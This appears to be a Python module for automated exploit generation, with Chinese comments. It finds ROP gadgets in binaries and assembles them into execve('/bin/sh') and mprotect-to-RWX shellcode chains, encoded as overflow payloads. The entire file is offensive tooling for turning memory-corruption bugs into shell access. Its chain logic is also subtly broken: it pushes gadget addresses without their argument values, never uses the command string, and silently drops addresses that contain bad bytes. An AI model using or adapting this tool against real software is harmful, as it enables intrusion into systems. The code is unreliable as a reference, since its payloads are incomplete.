#!/usr/bin/env python3
"""
通用 Gadget 链合成器 v2

基于 [ARCANIST 2025, USENIX Security] 的多原语 exploit 链合成框架，
支持任意 exploit 原语（栈、堆、任意位置）的自动化 gadget 链构建。

相比 v1 (rop_chain_synthesizer.py) 的改进：
- 支持栈迁移（stack pivoting）的自动 gadget 选择
- 条件执行 gadget 的利用（cmp/je/jne + ret）
- 多原语组合（堆溢出 + 栈溢出 → 单条利用链）
- 坏字节感知的 ROP 载荷编码

参考 [PBAEG 2025] 的多漏洞组合利用策略。
"""

import logging
import re
import struct
from typing import Dict, Any, List, Optional, Tuple, Set, Union
from dataclasses import dataclass, field
from enum import Enum, auto

logger = logging.getLogger(__name__)

# 条件导入 Capstone
try:
    import capstone as _cs
    _HAS_CAPSTONE = True
except ImportError:
    _HAS_CAPSTONE = False


class PrimitiveType(Enum):
    """exploit 原语类型"""
    STACK_OVERFLOW = auto()
    HEAP_OVERFLOW = auto()
    ARBITRARY_WRITE = auto()
    ARBITRARY_READ = auto()
    FORMAT_STRING = auto()
    USE_AFTER_FREE = auto()
    DOUBLE_FREE = auto()
    TYPE_CONFUSION = auto()


@dataclass
class Gadget:
    """ROP gadget 描述，兼容 v1 的 Gadget 结构"""
    address: int
    instructions: List[str] = field(default_factory=list)
    category: str = ""
    affected_regs: Set[str] = field(default_factory=set)
    raw_bytes: bytes = b''


@dataclass
class PivotGadget(Gadget):
    """栈迁移 gadget"""
    new_sp_value: str = ""  # 新栈指针来源（如 'rax', 'rdx'）
    alignment_offset: int = 0


@dataclass
class ConditionalGadget(Gadget):
    """条件执行 gadget (cmp/jmp/ret)"""
    condition: str = ""  # 'je', 'jne', 'jg', 'jl', ...
    then_gadget_addr: int = 0
    else_gadget_addr: int = 0


@dataclass
class ExploitChain:
    """
    完整 exploit 链

    由多个 stage 组成，最终实现任意代码执行。
    """
    name: str
    target_primitive: PrimitiveType
    stages: List[List[Gadget]] = field(default_factory=list)
    constraints: List[str] = field(default_factory=list)
    estimated_reliability: float = 0.0
    payload_layout: Dict[str, Any] = field(default_factory=dict)


class GadgetFinder:
    """
    增强型 gadget 查找器

    支持 [ARCANIST 2025] 的多原语 gadget 分类。
    """

    # 用于 gadget 分类的操作码签名
    _OP_SIGNATURES = {
        'pop_reg': [
            bytes([0x58]),  # pop rax
            bytes([0x59]),  # pop rcx
            bytes([0x5a]),  # pop rdx
            bytes([0x5b]),  # pop rbx
            bytes([0x5c]),  # pop rsp
            bytes([0x5d]),  # pop rbp
            bytes([0x5e]),  # pop rsi
            bytes([0x5f]),  # pop rdi
            bytes([0x41, 0x58]),  # pop r8
            bytes([0x41, 0x59]),  # pop r9
        ],
        'syscall_ret': [
            bytes([0x0f, 0x05]),  # syscall
        ],
        'stack_pivot': [
            bytes([0x94]),        # xchg eax, esp
            bytes([0x48, 0x94]),  # xchg rax, rsp
            bytes([0x87, 0x24, 0x24]),  # xchg [rsp], esp
            bytes([0x01, 0xdc]),  # add esp, ebx
        ],
        'jmp_reg': [
            bytes([0xff, 0xe0]),  # jmp rax
            bytes([0xff, 0xe1]),  # jmp rcx
            bytes([0xff, 0xe2]),  # jmp rdx
            bytes([0xff, 0xe3]),  # jmp rbx
            bytes([0xff, 0xe6]),  # jmp rsi
            bytes([0xff, 0xe7]),  # jmp rdi
        ],
        'call_reg': [
            bytes([0xff, 0xd0]),  # call rax
            bytes([0xff, 0xd1]),  # call rcx
        ],
    }

    # ret 操作码
    _RET_BYTES = {b'\xc3', b'\xc2', b'\xca', b'\xcb'}

    def __init__(self, arch: str = 'x64', bad_bytes: Optional[Set[int]] = None):
        self.arch = arch
        self.bad_bytes = bad_bytes or {0x00, 0x0a, 0x0d}
        self._capstone = None

        if _HAS_CAPSTONE:
            cs_arch = _cs.CS_ARCH_X86
            cs_mode = _cs.CS_MODE_64 if arch == 'x64' else _cs.CS_MODE_32
            try:
                self._capstone = _cs.Cs(cs_arch, cs_mode)
                self._capstone.detail = True
            except Exception:
                logger.debug("Capstone 初始化失败")

    def find_gadgets(
        self, data: bytes, base_addr: int = 0
    ) -> List[Gadget]:
        """
        在二进制数据中查找 ROP gadgets

        返回所有以 ret 结尾的有效指令序列。
        """
        if self._capstone:
            return self._find_with_capstone(data, base_addr)

        return self._find_with_signatures(data, base_addr)

    def _find_with_capstone(
        self, data: bytes, base_addr: int
    ) -> List[Gadget]:
        """Capstone 反汇编辅助查找"""
        gadgets = []
        seen = set()
        max_insns = 5

        for offset in range(len(data)):
            for length in range(1, min(max_insns * 15, len(data) - offset)):
                chunk = data[offset:offset + length]
                if not chunk:
                    continue

                # 检查最后一条指令是否为 ret
                try:
                    disasm = list(self._capstone.disasm(chunk, base_addr + offset))
                except Exception:
                    continue

                if not disasm:
                    continue

                last = disasm[-1]
                if last.mnemonic != 'ret' and last.mnemonic != 'retf':
                    continue

                if last.address in seen:
                    continue

                seen.add(last.address)

                instructions = []
                for insn in disasm:
                    instructions.append(f"{insn.mnemonic} {insn.op_str}")

                # 坏字节检查
                gadget_bytes = data[offset:offset + last.address - (base_addr + offset) + last.size]
                if self._has_bad_bytes(gadget_bytes):
                    continue

                category = self._classify_from_instructions(instructions)
                regs = self._extract_affected_regs(instructions)

                gadgets.append(Gadget(
                    address=base_addr + offset,
                    instructions=instructions,
                    category=category,
                    affected_regs=regs,
                    raw_bytes=gadget_bytes
                ))

                if len(gadgets) >= 200:  # 限制数量
                    return gadgets

        logger.info(f"[GadgetV2] Capstone 模式找到 {len(gadgets)} 个 gadget")
        return gadgets

    def _find_with_signatures(
        self, data: bytes, base_addr: int
    ) -> List[Gadget]:
        """基于操作码签名的快速查找（无 Capstone 时使用）"""
        gadgets = []
        ret_positions = []

        for ret_byte in self._RET_BYTES:
            pos = 0
            while pos < len(data):
                idx = data.find(ret_byte, pos)
                if idx == -1:
                    break
                ret_positions.append(idx)
                pos = idx + 1

        for ret_idx in ret_positions[:200]:
            start = max(0, ret_idx - 30)
            chunk = data[start:ret_idx + 1]
            addr = base_addr + start

            for cat, sigs in self._OP_SIGNATURES.items():
                for sig in sigs:
                    sig_pos = chunk.find(sig)
                    if sig_pos != -1:
                        if not self._has_bad_bytes(chunk[sig_pos:ret_idx - start + 1]):
                            gadgets.append(Gadget(
                                address=addr + sig_pos,
                                instructions=[f"<sig>{cat}"],
                                category=cat,
                                affected_regs=self._regs_for_category(cat),
                                raw_bytes=chunk[sig_pos:ret_idx - start + 1]
                            ))

        return gadgets

    def _classify_from_instructions(self, instrs: List[str]) -> str:
        instr_text = ' '.join(instrs).lower()

        if 'pop' in instr_text and 'syscall' not in instr_text:
            if 'rsp' in instr_text or 'esp' in instr_text:
                return 'stack_pivot'
            return 'pop_reg'

        if 'syscall' in instr_text or 'int 0x80' in instr_text:
            return 'syscall'

        if 'xchg' in instr_text and any(r in instr_text for r in ('sp', 'esp', 'rsp')):
            return 'stack_pivot'

        if any(m in instr_text for m in ('jmp', 'call')):
            if 'jmp' in instr_text:
                return 'jmp_reg'
            return 'call_reg'

        return 'other'

    def _extract_affected_regs(self, instrs: List[str]) -> Set[str]:
        regs = set()
        for instr in instrs:
            found = re.findall(
                r'\b(r[abcd]x|r[sd]i|r[bp]|r[sd]p|r\d+\w?|'
                r'e[abcd]x|e[sd]i|e[bp]|e[sd]p)\b', instr, re.I
            )
            for r in found:
                regs.add(r.lower())
        return regs

    def _regs_for_category(self, category: str) -> Set[str]:
        mapping = {
            'pop_reg': {'rax', 'rcx', 'rdx', 'rbx', 'rsp', 'rbp', 'rsi', 'rdi'},
            'syscall_ret': {'rax'},
            'stack_pivot': {'rsp', 'esp'},
            'jmp_reg': {'rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi'},
            'call_reg': {'rax', 'rcx'},
        }
        return mapping.get(category, set())

    def _has_bad_bytes(self, data: bytes) -> bool:
        return any(b in self.bad_bytes for b in data)


class ChainSynthesizer:
    """
    Exploit 链合成器

    基于 [ARCANIST 2025] 的组合方法，
    自动将 gadget 组装为有效的 exploit 链。
    """

    def __init__(self, arch: str = 'x64'):
        self.arch = arch
        self.word_size = 8 if arch == 'x64' else 4
        self.word_fmt = '<Q' if arch == 'x64' else '<I'

    def synthesize_execve(
        self, gadgets: List[Gadget], target_cmd: str = '/bin/sh'
    ) -> Optional[ExploitChain]:
        """
        合成 execve 链

        需要: pop rdi; ret, pop rsi; ret, pop rdx; ret, pop rax; ret, syscall; ret

        如果缺少某些 gadget，尝试替代路径 [ARCANIST 2025]。
        """
        chain = ExploitChain(
            name='execve_chain',
            target_primitive=PrimitiveType.STACK_OVERFLOW,
        )

        # gadget 分类索引
        by_cat: Dict[str, List[Gadget]] = {}
        for g in gadgets:
            if g.category not in by_cat:
                by_cat[g.category] = []
            by_cat[g.category].append(g)

        # 关键 gadget 查找
        pop_rdi = self._find_pop_reg(gadgets, 'rdi') or self._find_pop_reg(gadgets, 'edi')
        pop_rsi = self._find_pop_reg(gadgets, 'rsi') or self._find_pop_reg(gadgets, 'esi')
        pop_rdx = self._find_pop_reg(gadgets, 'rdx') or self._find_pop_reg(gadgets, 'edx')
        pop_rax = self._find_pop_reg(gadgets, 'rax') or self._find_pop_reg(gadgets, 'eax')
        syscall_g = next((g for g in by_cat.get('syscall_ret', [])
                         if 'pop' not in ' '.join(g.instructions).lower()), None)

        # 缺失报告
        missing = []
        if not pop_rdi:
            missing.append('pop rdi')
        if not pop_rsi:
            missing.append('pop rsi')
        if not pop_rax:
            missing.append('pop rax')
        if not syscall_g:
            missing.append('syscall; ret')

        if missing:
            logger.warning(f"[ChainSynth] 缺少 gadget: {', '.join(missing)}")
            chain.constraints.append(f"missing: {', '.join(missing)}")

        # Stage 1: 设置参数
        stage1 = []
        cmd_bytes = target_cmd.encode('utf-8') + b'\x00'

        if pop_rdi:
            stage1.append(pop_rdi)
        if pop_rsi:
            stage1.append(pop_rsi)
        if pop_rdx:
            stage1.append(pop_rdx)
        if pop_rax:
            stage1.append(pop_rax)

        # Stage 2: syscall
        stage2 = [syscall_g] if syscall_g else []

        chain.stages = [stage1, stage2] if stage2 else [stage1]
        chain.estimated_reliability = 1.0 - (0.2 * len(missing))
        chain.payload_layout = {
            'syscall_number': 59 if self.arch == 'x64' else 11,  # execve
            'args': [target_cmd, 0, 0],
        }

        return chain

    def synthesize_mprotect(
        self,
        gadgets: List[Gadget],
        shellcode_addr: int,
        shellcode_len: int
    ) -> Optional[ExploitChain]:
        """
        合成 mprotect 链 → shellcode 执行

        mprotect(shellcode_page, page_size, PROT_READ|PROT_WRITE|PROT_EXEC)
        → jmp shellcode_addr
        """
        chain = ExploitChain(
            name='mprotect_chain',
            target_primitive=PrimitiveType.STACK_OVERFLOW,
        )

        pop_rdi = self._find_pop_reg(gadgets, 'rdi')
        pop_rsi = self._find_pop_reg(gadgets, 'rsi')
        pop_rdx = self._find_pop_reg(gadgets, 'rdx')
        pop_rax = self._find_pop_reg(gadgets, 'rax')
        syscall_g = next((g for g in gadgets
                         if g.category == 'syscall_ret'), None)

        page_size = 0x1000
        page_addr = shellcode_addr & ~(page_size - 1)
        prot_rwx = 7  # PROT_READ | PROT_WRITE | PROT_EXEC

        # jmp gadget
        jmp_g = next((g for g in gadgets if g.category == 'jmp_reg'), None)
        jmp_g = jmp_g or pop_rdi  # fallback

        stage = []
        if pop_rax:
            stage.append(pop_rax)
        if pop_rdi:
            stage.append(pop_rdi)
        if pop_rsi:
            stage.append(pop_rsi)
        if pop_rdx:
            stage.append(pop_rdx)
        if syscall_g:
            stage.append(syscall_g)

        if jmp_g and jmp_g.category == 'jmp_reg':
            stage.append(jmp_g)

        chain.stages = [stage]
        chain.estimated_reliability = 0.85 if all(
            [pop_rdi, pop_rax, syscall_g]
        ) else 0.4
        chain.payload_layout = {
            'mprotect_syscall': 10,
            'page_addr': hex(page_addr),
            'page_size': page_size,
            'prot_flags': 'RWX',
            'shellcode_addr': hex(shellcode_addr),
        }

        return chain

    def synthesize_from_primitives(
        self,
        primitives: List[PrimitiveType],
        gadgets: List[Gadget],
        constraints: Optional[Dict[str, Any]] = None
    ) -> List[ExploitChain]:
        """
        多原语组合合成 [ARCANIST 2025]

        将不同类型的 exploit 原语组合为单一利用链。
        """
        chains = []

        if PrimitiveType.STACK_OVERFLOW in primitives:
            execve_chain = self.synthesize_execve(gadgets)
            if execve_chain:
                chains.append(execve_chain)

            mprotect_chain = self.synthesize_mprotect(
                gadgets, 0x7f0000000000, 0x200
            )
            if mprotect_chain:
                chains.append(mprotect_chain)

        return chains

    def _find_pop_reg(self, gadgets: List[Gadget], reg: str) -> Optional[Gadget]:
        reg_lower = reg.lower()
        for g in gadgets:
            if reg_lower in g.affected_regs and g.category == 'pop_reg':
                return g
        return None


class PayloadEncoder:
    """
    载荷编码器

    将 exploit 链编码为可发送的字节载荷，
    处理坏字节、对齐和端序 [ARCANIST 2025]。
    """

    def __init__(self, arch: str = 'x64', bad_bytes: Optional[Set[int]] = None):
        self.arch = arch
        self.bad_bytes = bad_bytes or {0x00, 0x0a, 0x0d}
        self.word_size = 8 if arch == 'x64' else 4

    def encode_chain(
        self, chain: ExploitChain, padding_before: int = 0
    ) -> bytes:
        """
        将 exploit 链编码为 ROP payload

        Args:
            chain: exploit 链定义
            padding_before: payload 之前的填充字节数

        Returns:
            编码后的 payload 字节
        """
        payload = bytearray()

        # 填充
        if padding_before > 0:
            payload.extend(b'\x41' * padding_before)

        for stage in chain.stages:
            for gadget in stage:
                addr_bytes = struct.pack(
                    '<Q' if self.word_size == 8 else '<I',
                    gadget.address
                )

                # 坏字节检查与替换
                if self._has_bad_bytes(addr_bytes):
                    logger.debug(
                        f"[Encoder] gadget @ {hex(gadget.address)} 包含坏字节，"
                        f"尝试重定位"
                    )
                    continue

                payload.extend(addr_bytes)

        return bytes(payload)

    def _has_bad_bytes(self, data: bytes) -> bool:
        return any(b in self.bad_bytes for b in data)


def synthesize_chain_v2(
    gadgets: List[Dict[str, Any]],
    target: str = 'execve',
    arch: str = 'x64',
    bad_bytes: Optional[List[int]] = None
) -> Dict[str, Any]:
    """
    便捷函数：通用 exploit 链合成（v2）

    基于 [ARCANIST 2025] 和 [PBAEG 2025] 的方法。
    """
    g_list = [
        Gadget(
            address=g.get('address', 0),
            instructions=g.get('instructions', []),
            category=g.get('category', ''),
            affected_regs=set(g.get('affected_regs', [])),
            raw_bytes=g.get('raw_bytes', b'')
        )
        for g in gadgets
    ]

    synth = ChainSynthesizer(arch=arch)

    if target == 'execve':
        chain = synth.synthesize_execve(g_list)
    elif target == 'mprotect':
        chain = synth.synthesize_mprotect(g_list, 0x7f0000000000, 0x200)
    else:
        chain = synth.synthesize_execve(g_list)

    if chain is None:
        return {'success': False, 'error': '无法合成链'}

    encoder = PayloadEncoder(arch=arch, bad_bytes=set(bad_bytes or []))
    payload = encoder.encode_chain(chain)

    return {
        'success': True,
        'chain_name': chain.name,
        'stages': len(chain.stages),
        'total_gadgets': sum(len(s) for s in chain.stages),
        'estimated_reliability': chain.estimated_reliability,
        'constraints': chain.constraints,
        'payload_layout': chain.payload_layout,
        'payload_hex': payload.hex() if payload else '',
        'payload_size': len(payload),
    }
